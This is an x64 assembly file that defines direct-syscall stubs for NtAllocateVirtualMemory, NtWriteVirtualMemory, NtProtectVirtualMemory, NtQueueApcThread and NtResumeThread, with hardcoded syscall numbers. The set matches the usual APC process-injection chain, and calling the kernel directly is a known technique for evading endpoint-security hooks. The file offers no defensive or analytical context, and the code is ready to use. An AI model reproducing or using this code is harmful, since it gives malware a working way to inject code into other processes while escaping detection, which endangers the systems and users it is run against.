.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x18       // SSN -- verify on your build via x64dbg or j00ru table
    syscall
    ret

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x3A
    syscall
    ret

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x50
    syscall
    ret

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, 0x45
    syscall
    ret

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, 0x52
    syscall
    ret
